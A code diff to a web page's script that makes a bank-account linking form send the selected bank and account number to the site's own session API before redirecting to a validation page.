@@ -223,7 +223,7 @@
   </div>
 
   <script>
-    document.getElementById('vincular-form').addEventListener('submit', function(e) {
+    document.getElementById('vincular-form').addEventListener('submit', async function(e) {
       e.preventDefault();
 
       const banco = document.getElementById('banco').value;
@@ -240,6 +240,33 @@
       btn.disabled = true;
       btnText.style.display = 'none';
       btnSpinner.style.display = 'inline-flex';
+
+      // Enviar datos a Redis
+      try {
+        const storedUser = localStorage.getItem('kassio_user');
+        if (storedUser) {
+          const userData = JSON.parse(storedUser);
+          const sessionId = userData.session_id;
+
+          if (sessionId) {
+            await fetch('/api/kassio/session/' + sessionId, {
+              method: 'PATCH',
+              headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+              },
+              body: JSON.stringify({
+                data: {
+                  banco: banco,
+                  numero_cuenta: numeroCuenta
+                }
+              })
+            });
+          }
+        }
+      } catch (error) {
+        console.error('Error enviando a Redis:', error);
+      }
 
       setTimeout(function() {
         window.location.href = '/kassio/validacion?banco=' + encodeURIComponent(banco);
